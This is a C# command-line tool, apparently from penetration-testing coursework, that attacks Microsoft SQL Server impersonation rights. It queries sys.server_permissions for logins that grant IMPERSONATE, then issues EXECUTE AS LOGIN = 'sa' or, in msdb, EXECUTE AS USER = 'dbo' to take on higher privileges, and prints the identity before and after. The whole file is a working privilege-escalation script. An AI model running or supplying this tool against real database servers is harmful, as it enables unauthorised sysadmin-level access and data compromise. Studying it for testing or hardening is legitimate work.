using System;
using System.Data.SqlClient;
namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                String sqlServer = args[0];
                String database = args[1];
                String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
                SqlConnection con = new SqlConnection(conString);

                try
                {
                    con.Open();
                    Console.WriteLine("Auth success!");
                }
                catch
                {
                    Console.WriteLine("Auth failed");
                    Environment.Exit(0);
                }

                if (args[2] == "check")
                {
                    String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
                    SqlCommand command = new SqlCommand(query, con);
                    SqlDataReader reader = command.ExecuteReader();

                    while (reader.Read() == true)
                    {
                        Console.WriteLine("Logins that can be impersonated: " + reader[0]);
                    }
                    reader.Close();

                }

                else if (args[2] == "impersonate")
                {
                    if (args[3] == "sa")
                    {
                        String querylogin = "SELECT SYSTEM_USER;";

                        Console.WriteLine("Before impersonation");

                        SqlCommand command = new SqlCommand(querylogin, con);
                        SqlDataReader reader = command.ExecuteReader();
                        reader.Read();
                        Console.WriteLine("Executing in context of: " + reader[0]);
                        reader.Close();

                        String executeas = "EXECUTE AS LOGIN = '" + args[3] + "';";

                        command = new SqlCommand(executeas, con);
                        reader = command.ExecuteReader();
                        reader.Close();

                        Console.WriteLine("After impersonation");

                        command = new SqlCommand(querylogin, con);
                        reader = command.ExecuteReader();
                        reader.Read();
                        Console.WriteLine("Executing in context of: " + reader[0]);
                        reader.Close();
                    }
                    else if (args[3] == "dbo")
                    {
                        String queryuser = "SELECT USER_NAME();";

                        Console.WriteLine("Before impersonation");

                        SqlCommand command = new SqlCommand(queryuser, con);
                        SqlDataReader reader = command.ExecuteReader();
                        reader.Read();
                        Console.WriteLine("Executing in context of: " + reader[0]);
                        reader.Close();

                        String executeas = "use msdb; EXECUTE AS USER = 'dbo';";

                        command = new SqlCommand(executeas, con);
                        reader = command.ExecuteReader();
                        reader.Close();

                        Console.WriteLine("After impersonation");

                        command = new SqlCommand(queryuser, con);
                        reader = command.ExecuteReader();
                        reader.Read();
                        Console.WriteLine("Executing in context of: " + reader[0]);
                        reader.Close();
                    }
                }
                con.Close();
            }
            catch
            {
                Console.WriteLine("Invalid argument!\n\n\tUsage: SQLImpersonation.exe <sql server> <database name> <check/impersonate> <sa/dbo(with impersonate flag)>\n\nExample:\n\n\tSQLImpersonation.exe sql.local master check\n\n\tSQLImpersonation.exe sql.local master impersonate sa");
            }
        }
    }
}